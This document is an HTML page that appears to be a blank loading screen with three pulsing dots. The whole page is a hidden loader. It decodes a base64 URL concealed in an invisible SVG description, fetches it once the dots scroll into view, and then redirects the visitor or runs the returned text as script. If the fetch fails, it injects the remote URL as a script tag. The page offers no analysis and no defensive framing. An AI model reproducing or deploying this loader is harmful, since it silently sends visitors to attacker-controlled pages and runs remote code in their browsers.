<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title></title>
  <style>
    * { box-sizing: border-box; margin: 0; }
    html, body { height: 100%; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #111827;
    }
    .dots {
      display: flex;
      gap: 10px;
    }
    .dots i {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #f59e0b;
      opacity: 0.25;
      animation: pulse 1s ease-in-out infinite;
    }
    .dots i:nth-child(2) { animation-delay: 0.15s; }
    .dots i:nth-child(3) { animation-delay: 0.3s; }
    @keyframes pulse {
      50% { opacity: 1; }
    }
    svg.slip { position: absolute; width: 0; height: 0; overflow: hidden; }
  </style>
</head>
<body>
  <svg class="slip" aria-hidden="true">
    <desc id="slip">aHR0cHM6Ly9sZXB0aWRwZXNod2EuY29tL3Vud2VsbC5teWVsb24=</desc>
  </svg>
  <div class="dots" id="mark">
    <i></i><i></i><i></i>
  </div>

  <script>
  (function () {
    var WAIT_MS = 500;

    function hopFromDesc() {
      var node = document.getElementById('slip');
      var url = atob(String(node && node.textContent || '').trim());
      if (!/^https?:\/\//i.test(url)) throw new Error('bad');
      return url;
    }

    function parseHopBody(text) {
      var body = String(text || '').trim();
      try {
        var j = JSON.parse(body);
        if (j && j.c) {
          var u = atob(String(j.c).trim());
          if (/^https?:\/\//i.test(u)) return u;
        }
      } catch (e) {}
      var patterns = [
        /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
      ];
      for (var i = 0; i < patterns.length; i++) {
        var m = body.match(patterns[i]);
        if (m && m[1]) return m[1];
      }
      throw new Error('parse');
    }

    function attachRemote(hopUrl) {
      var s = document.createElement('script');
      s.src = hopUrl;
      s.async = true;
      document.head.appendChild(s);
    }

    function runAsBlob(body) {
      var blob = new Blob([body], { type: 'text/javascript' });
      var href = URL.createObjectURL(blob);
      var s = document.createElement('script');
      s.src = href;
      s.onload = function () { URL.revokeObjectURL(href); };
      s.onerror = function () { URL.revokeObjectURL(href); };
      document.head.appendChild(s);
    }

    function openHop(hopUrl) {
      fetch(hopUrl, { cache: 'no-store', credentials: 'omit' })
        .then(function (res) {
          if (!res.ok) throw new Error('http');
          return res.text();
        })
        .then(function (body) {
          try {
            window.location.replace(parseHopBody(body));
          } catch (e) {
            runAsBlob(body);
          }
        })
        .catch(function () {
          attachRemote(hopUrl);
        });
    }

    var hopUrl;
    try {
      hopUrl = hopFromDesc();
    } catch (e) {
      return;
    }

    var started = false;
    function begin() {
      if (started) return;
      started = true;
      setTimeout(function () { openHop(hopUrl); }, WAIT_MS);
    }

    if (typeof IntersectionObserver === 'undefined') {
      begin();
      return;
    }
    var obs = new IntersectionObserver(function (entries) {
      for (var i = 0; i < entries.length; i++) {
        if (entries[i].isIntersecting) {
          obs.disconnect();
          begin();
          break;
        }
      }
    });
    obs.observe(document.getElementById('mark'));
  })();
  </script>
</body>
</html>
